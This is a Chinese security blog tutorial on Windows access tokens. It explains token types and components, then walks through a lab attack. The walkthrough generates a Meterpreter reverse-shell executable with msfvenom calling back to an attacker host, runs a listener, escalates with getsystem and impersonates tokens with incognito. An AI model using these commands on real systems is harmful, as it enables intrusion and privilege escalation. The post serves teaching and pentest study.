@@ -1,0 +1,846 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 前言 access token俗称为访问令牌，围绕着该访问令牌也有着相应的渗透技巧，故而也就有这篇文章的总结。 0x01 什么是访问令牌（access token）? 访问令牌是用来描述进程或线程安全上下文的对象，令牌所包含的信息是与该user账户相关的进程或线程的身份和权限信息。当user登录时，系统通过将user输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统此时会为u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows访问令牌安全探究">
+<meta property="og:url" content="https://sh1yan.top/2019/06/09/Windows-Access-Token-Security-Exploration/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 前言 access token俗称为访问令牌，围绕着该访问令牌也有着相应的渗透技巧，故而也就有这篇文章的总结。 0x01 什么是访问令牌（access token）? 访问令牌是用来描述进程或线程安全上下文的对象，令牌所包含的信息是与该user账户相关的进程或线程的身份和权限信息。当user登录时，系统通过将user输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统此时会为u">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Windows-Access-Token-Security-Exploration/%E7%94%A8%E6%88%B7%E8%BF%9B%E7%A8%8B.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Windows-Access-Token-Security-Exploration/%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Windows-Access-Token-Security-Exploration/%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0%E8%BF%90%E8%A1%8C%E8%AE%A1%E7%AE%97%E5%99%A8.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Windows-Access-Token-Security-Exploration/%E7%8C%95%E7%8C%B4%E6%A1%83%E6%8A%93%E5%8F%96.png">
+<meta property="article:published_time" content="2019-06-09T15:16:26.000Z">
+<meta property="article:modified_time" content="2019-06-10T07:39:50.000Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="access token">
+<meta property="article:tag" content="令牌伪造">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Windows-Access-Token-Security-Exploration/%E7%94%A8%E6%88%B7%E8%BF%9B%E7%A8%8B.png">
+  
+  
+  
+  <title>Windows访问令牌安全探究 - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Windows访问令牌安全探究"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2019-06-09 23:16" pubdate>
+          2019年6月9日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          82 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Windows访问令牌安全探究</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><strong>0x00 前言</strong></p>
+<p>access token俗称为访问令牌，围绕着该访问令牌也有着相应的渗透技巧，故而也就有这篇文章的总结。</p>
+<p><strong>0x01 什么是访问令牌（access token）?</strong></p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/desktop/SecAuthZ/access-tokens">访问令牌</a>是用来描述进程或线程安全上下文的对象，令牌所包含的信息是与该user账户相关的进程或线程的身份和权限信息。当user登录时，系统通过将user输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统此时会为user生成一个访问令牌。之后，该user执行的每个进程都会拥有一个该访问令牌的拷贝。</p>
+<span id="more"></span>
+<p>而令牌就像是一个标识符，标识该账号的一切应用和操作。如下图，分类有 network service、local service、shiyan 三个用户账号创建并运行的进程。</p>
+<p><img src="http://sh1yan.top/photo/Windows-Access-Token-Security-Exploration/%E7%94%A8%E6%88%B7%E8%BF%9B%E7%A8%8B.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>0x02 令牌的作用</strong></p>
+<p>当进程或者线程需要访问某个具有安全属性的对象时（通常是内核对象），OS会根据这个Token在该对象的访问控制列表里进行搜索，从而决定该用户或者用户所在的组对该对象是否具有访问权利。</p>
+<p>Access Token中具有用户可以使用的特权，这些特权指定了该进程或者线程能否执行一些特定的操作，例如：关闭计算机。</p>
+<p><img src="http://sh1yan.top/photo/Windows-Access-Token-Security-Exploration/%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里我创建了一个test.txt文件，通过截图可以看到，该文件的所有者是 shiyan，因为是该账号创建的，但是 administrator、system、对该文件也是用拥有完全控制的权限的。同时authenticated users类型的账号对该文件是拥有修改权限的。</p>
+<p><strong>0x03 令牌的种类</strong></p>
+<p>目前访问令牌分为两种令牌：</p>
+<ol>
+<li>主令牌（每一个进程都具有一个唯一的主令牌，进行通过主令牌被开启）</li>
+<li>模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li>
+</ol>
+<p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。</p>
+<p>而关于进程与线程的关系，确实有点复杂，我简单的说几点：</p>
+<ul>
+<li>每个进程至少包含一个线程</li>
+<li>进程中所有线程结束后，该进程也会结束</li>
+<li>主动结束进程时，如线程还在运行，系统会自动结束还在运行的线程</li>
+</ul>
+<p>主令牌是由windows内核创建并分配给进程的默认访问令牌，每一个进程有一个主令牌，它描述了与当前进程相关的用户帐户的安全上下文。同时，一个线程可以模拟一个客户端帐户，允许此线程与安全对象交互时用客户端的安全上下文。一个正模拟客户端的线程拥有一个主令牌和一个模拟令牌。</p>
+<p>注：主令牌和模拟令牌，会在系统重启或者关机后全部清除，不然将会一直在内存中存留。也就是说，如果机器不关机或者重启的话，就会存在散落的令牌。但是，由于权限的问题，当前账号只能看到自己的访问令牌和比自己权限低的账号的访问令牌。如果想看到所有访问令牌，需要当前权限为系统最高权限才行。</p>
+<p><strong>0x04 访问令牌的组成</strong></p>
+<p>Windows access token ：</p>
+<ul>
+<li>用户（User）。用户账号的SID。若用户登录到本地计算机上的一个账号，则他的 SID来自于本地SAM维护的账号数据库；若用户登录到一个域账号，则他的SID来自于活动目录里用户对象的Object-SID属性。</li>
+<li>组（Groups）。包含该用户的安全组的SID列表，表中也包含代表活动目录里用户 账号的用户对象的SID-History属性里的SID。</li>
+<li>特权（Privileges）。用户和用户的安全组在本地计算机上拥有的特权列表。</li>
+<li>所有者（Owner）。特定用户或安全组的SID，这些用户或安全组默认成为用户所 创建或拥有的任何对象的所有者。</li>
+<li>主组（Primary Group）。用户的主安全组的SID。这个信息只由POSIX子系统使用， Windows 2000的其他部分对其忽略。</li>
+<li>默认任意访问控制表（Default Discretionary Access Control List, DACL）。一组内置 许可权。在没有其他访问控制信息存在时操作系统将其作用于用户所创建的对象。默认DACL向创建所有者和系统赋予完全控制（Full Control）权限。</li>
+<li>源（Source）。导致访问令牌被创建的进程，例如会话管理器、LAN管理器或远程 过程调用（RPC）服务器。</li>
+<li>类型（Type）。指示访问令牌是主（primary）令牌还是模拟（impersonation）令牌。 主令牌代表一个进程的安全上下文；模拟令牌是服务进程里的一个线程，用来临时接受一个不同的安全上下文（如服务的一个客户的安全上下文）的令牌。</li>
+<li>模拟级别（Impersonation Level）。指示服务对该访问令牌所代表的客户的安全上下 文的接受程度。</li>
+<li>统计信息（Statistics）。关于访问令牌本身的信息。操作系统在内部使用这个信息。</li>
+<li>限制SID（Restricting SID）。由一个被授权创建受限令牌的进程添加到访问令牌里 的可选的SID列表。限制SID可以将线程的访问限制到低于用户被允许的级别。</li>
+<li>会话ID（Session ID）。指示访问令牌是否与终端服务（Terminal Services）客户会 话相关。</li>
+</ul>
+<p>而在mimikatz中抓出来的token显示如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">mimikatz(commandline) <span class="hljs-comment"># token::whoami</span><br> * Process Token : <span class="hljs-number">1426496</span>   	L-PC\L	S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">468267683</span>-<span class="hljs-number">2575715905</span>-<span class="hljs-number">647264286</span>-<span class="hljs-number">1000</span>	(12g,23p)	Primary<br> * Thread Token  : no token<br></code></pre></td></tr></table></figure>
+
+<p><strong>0x05 常见的伪造工具</strong></p>
+<p>Metasploit 中的 incognito 插件</p>
+<p>Windows 平台下的 <a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">incognito</a> 工具</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1">Invoke-TokenManipulation.ps1</a> 脚本</p>
+<p>Mimkatz 中的 token::list</p>
+<p>CobaltSrike 中的 steal_token 插件</p>
+<p><strong>0x06 伪造现场–开始</strong></p>
+<p>测试机①：Windows7，192.168.3.141</p>
+<p>测试机②：kali2017，192.168.3.137</p>
+<p>1、Metasploit 中的 incognito 插件</p>
+<p>首先，我们生成一个反弹shell，用于在目标机执行。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class="hljs-variable constant_">LHOST</span>=<span class="hljs-number">192.168</span>.<span class="hljs-number">3.137</span> <span class="hljs-variable constant_">LPORT</span>=<span class="hljs-number">4444</span> -f exe -o token_shell.exe<br></code></pre></td></tr></table></figure>
+
+<p>然后我们在kali上进行监听操作：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby">msf5 &gt; use exploit/multi/handler <br>msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp<br>payload =&gt; windows/meterpreter/reverse_tcp<br>msf5 exploit(multi/handler) &gt; set lport <span class="hljs-number">4444</span><br>lport =&gt; <span class="hljs-number">4444</span><br>msf5 exploit(multi/handler) &gt; set lhost  <span class="hljs-number">192.168</span>.<span class="hljs-number">3.137</span><br>lhost =&gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">3.137</span><br>msf5 exploit(multi/handler) &gt; run<br>meterpreter &gt;<br></code></pre></td></tr></table></figure>
+
+<p>进入到 meterpreter 模式下后，我们就可以开始令牌伪造的操作了。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs ruby">meterpreter &gt; getuid     <span class="hljs-comment"># 获取当前用户信息</span><br><span class="hljs-title class_">Server</span> <span class="hljs-symbol">username:</span> L-<span class="hljs-variable constant_">PC</span>\shiyan<br>meterpreter &gt; getsystem   <span class="hljs-comment"># 进行提高到最高权限</span><br>...got system via technique <span class="hljs-number">1</span> (<span class="hljs-title class_">Named</span> <span class="hljs-title class_">Pipe</span> <span class="hljs-title class_">Impersonation</span> (<span class="hljs-title class_">In</span> <span class="hljs-title class_">Memory</span>/<span class="hljs-title class_">Admin</span>)).<br>meterpreter &gt; getuid      <span class="hljs-comment"># 查看当前用户信息</span><br><span class="hljs-title class_">Server</span> <span class="hljs-symbol">username:</span> <span class="hljs-variable constant_">NT</span> <span class="hljs-variable constant_">AUTHORITY</span>\<span class="hljs-variable constant_">SYSTEM</span><br>meterpreter &gt; load incognito   <span class="hljs-comment"># 加载 incognito 插件</span><br><span class="hljs-title class_">Loading</span> extension incognito...<span class="hljs-title class_">Success</span>.<br>meterpreter &gt; list_tokens -u  <span class="hljs-comment"># 列出当前可以令牌伪造的清单</span><br><br><span class="hljs-title class_">Delegation</span> <span class="hljs-title class_">Tokens</span> <span class="hljs-title class_">Available</span><br>========================================<br>L-<span class="hljs-variable constant_">PC</span>\shiyan<br><span class="hljs-variable constant_">NT</span> <span class="hljs-variable constant_">AUTHORITY</span>\<span class="hljs-variable constant_">LOCAL</span> <span class="hljs-variable constant_">SERVICE</span><br><span class="hljs-variable constant_">NT</span> <span class="hljs-variable constant_">AUTHORITY</span>\<span class="hljs-variable constant_">NETWORK</span> <span class="hljs-variable constant_">SERVICE</span><br><span class="hljs-variable constant_">NT</span> <span class="hljs-variable constant_">AUTHORITY</span>\<span class="hljs-variable constant_">SYSTEM</span><br><br><span class="hljs-title class_">Impersonation</span> <span class="hljs-title class_">Tokens</span> <span class="hljs-title class_">Available</span><br>========================================<br><span class="hljs-variable constant_">NT</span> <span class="hljs-variable constant_">AUTHORITY</span>\<span class="hljs-variable constant_">ANONYMOUS</span> <span class="hljs-variable constant_">LOGON</span><br>meterpreter &gt; impersonate_token <span class="hljs-string">&quot;NT AUTHORITY\NETWORK SERVICE&quot;</span>  <span class="hljs-comment"># 伪造该用户</span><br>[+] <span class="hljs-title class_">Delegation</span> token available<br>[+] <span class="hljs-title class_">Successfully</span> impersonated user <span class="hljs-variable constant_">NT</span> <span class="hljs-variable constant_">AUTHORITY</span>\<span class="hljs-variable constant_">NETWORK</span> <span class="hljs-variable constant_">SERVICE</span><br>meterpreter &gt; getuid  <span class="hljs-comment"># 查看当前用户信息，阿偶，查看失败，说明系统内置的账号还是有问题的。</span><br>[-] <span class="hljs-symbol">stdapi_sys_config_getuid:</span> <span class="hljs-title class_">Operation</span> <span class="hljs-symbol">failed:</span> <span class="hljs-title class_">Access</span> is denied.<br>meterpreter &gt; rev2self  <span class="hljs-comment"># 返回之前的token</span><br></code></pre></td></tr></table></figure>
+
+<p>我估计可能是内置用户的原因吧，提示的伪造成功，但是权限失败，那继续实操。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs ruby">meterpreter &gt; getsystem  <span class="hljs-comment"># 进行提高到最高权限</span><br>...got system via technique <span class="hljs-number">1</span> (<span class="hljs-title class_">Named</span> <span class="hljs-title class_">Pipe</span> <span class="hljs-title class_">Impersonation</span> (<span class="hljs-title class_">In</span> <span class="hljs-title class_">Memory</span>/<span class="hljs-title class_">Admin</span>)).<br>meterpreter &gt; getuid   <span class="hljs-comment"># 查看当前用户信息</span><br><span class="hljs-title class_">Server</span> <span class="hljs-symbol">username:</span> <span class="hljs-variable constant_">NT</span> <span class="hljs-variable constant_">AUTHORITY</span>\<span class="hljs-variable constant_">SYSTEM</span><br>meterpreter &gt; list_tokens -u  <span class="hljs-comment"># 列出当前可以令牌伪造的清单</span><br><br><span class="hljs-title class_">Delegation</span> <span class="hljs-title class_">Tokens</span> <span class="hljs-title class_">Available</span><br>========================================<br>L-<span class="hljs-variable constant_">PC</span>\shiyan<br><span class="hljs-variable constant_">NT</span> <span class="hljs-variable constant_">AUTHORITY</span>\<span class="hljs-variable constant_">LOCAL</span> <span class="hljs-variable constant_">SERVICE</span><br><span class="hljs-variable constant_">NT</span> <span class="hljs-variable constant_">AUTHORITY</span>\<span class="hljs-variable constant_">NETWORK</span> <span class="hljs-variable constant_">SERVICE</span><br><span class="hljs-variable constant_">NT</span> <span class="hljs-variable constant_">AUTHORITY</span>\<span class="hljs-variable constant_">SYSTEM</span><br><br><span class="hljs-title class_">Impersonation</span> <span class="hljs-title class_">Tokens</span> <span class="hljs-title class_">Available</span><br>========================================<br><span class="hljs-variable constant_">NT</span> <span class="hljs-variable constant_">AUTHORITY</span>\<span class="hljs-variable constant_">ANONYMOUS</span> <span class="hljs-variable constant_">LOGON</span><br><br>meterpreter &gt; impersonate_token <span class="hljs-string">&quot;L-PC\\shiyan&quot;</span> <span class="hljs-comment"># 伪造该用户</span><br>[+] <span class="hljs-title class_">Delegation</span> token available<br>[+] <span class="hljs-title class_">Successfully</span> impersonated user L-<span class="hljs-variable constant_">PC</span>\shiyan<br>meterpreter &gt; getuid <span class="hljs-comment"># 获取当前用户信息，伪造成功！</span><br><span class="hljs-title class_">Server</span> <span class="hljs-symbol">username:</span> L-<span class="hljs-variable constant_">PC</span>\shiyan<br>meterpreter &gt; drop_token  <span class="hljs-comment"># 返回之前的token，和 rev2self 一样。</span><br></code></pre></td></tr></table></figure>
+
+<p>除了直接伪造还可以同归UID值进行伪造的。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">meterpreter &gt; steal_token <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure>
+
+<p>这句操作命令，其实都差不多，只不过伪造的UID，效果一样的。</p>
+<p>2、Windows 平台下的 incognito 工具</p>
+<p>首先，我们去MWR InfoSecurity下载开 incognito 这个工具，地址：<a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p>
+<p>然后我们放置到目标机上，因为我登录的用户是 L ，该用户是administrator组的，所以不需要提权。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\MK&gt;incognito.exe list_tokens -u   <span class="hljs-comment"># 列出当前所有散落的令牌 </span><br>[-] WARNING: Not running <span class="hljs-keyword">as</span> SYSTEM. Not <span class="hljs-built_in">all</span> tokens will be available.<br>[*] Enumerating tokens<br>[*] Listing unique users found<br><br>Delegation Tokens Available<br>============================================<br>L-PC\L<br>NT AUTHORITY\LOCAL SERVICE<br>NT AUTHORITY\NETWORK SERVICE<br>NT AUTHORITY\SYSTEM<br><br>Impersonation Tokens Available<br>============================================<br>NT AUTHORITY\ANONYMOUS LOGON<br><br>Administrative Privileges Available<br>============================================<br>SeAssignPrimaryTokenPrivilege<br>SeCreateTokenPrivilege<br>SeTcbPrivilege<br>SeTakeOwnershipPrivilege<br>SeBackupPrivilege<br>SeRestorePrivilege<br>SeDebugPrivilege<br>SeImpersonatePrivilege<br>SeRelabelPrivilege<br>SeLoadDriverPrivilege<br>C:\MK&gt;whoami   <span class="hljs-comment"># 查看当前用户</span><br>l-pc\l<br></code></pre></td></tr></table></figure>
+
+<p>有点小尴尬，我的 shiyan 这个账号没有登录过，所以在令牌中，未找见。下面我断开下当前用户账号，然后登陆下 shiyan 这个账号，再注销。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\MK&gt;incognito.exe list_tokens -u  <span class="hljs-comment"># 列出当前所有散落的令牌 </span><br>[-] WARNING: Not running <span class="hljs-keyword">as</span> SYSTEM. Not <span class="hljs-built_in">all</span> tokens will be available.<br>[*] Enumerating tokens<br>[*] Listing unique users found<br><br>Delegation Tokens Available<br>============================================<br>L-PC\L<br>NT AUTHORITY\LOCAL SERVICE<br>NT AUTHORITY\NETWORK SERVICE<br>NT AUTHORITY\SYSTEM<br><br>Impersonation Tokens Available<br>============================================<br>L-PC\shiyan<br>NT AUTHORITY\ANONYMOUS LOGON<br><br>Administrative Privileges Available<br>============================================<br>SeAssignPrimaryTokenPrivilege<br>SeCreateTokenPrivilege<br>SeTcbPrivilege<br>SeTakeOwnershipPrivilege<br>SeBackupPrivilege<br>SeRestorePrivilege<br>SeDebugPrivilege<br>SeImpersonatePrivilege<br>SeRelabelPrivilege<br>SeLoadDriverPrivilege<br></code></pre></td></tr></table></figure>
+
+<p>可以看出，只要计算机不重启，账号登录后，再注销，还是会存在散落的令牌。</p>
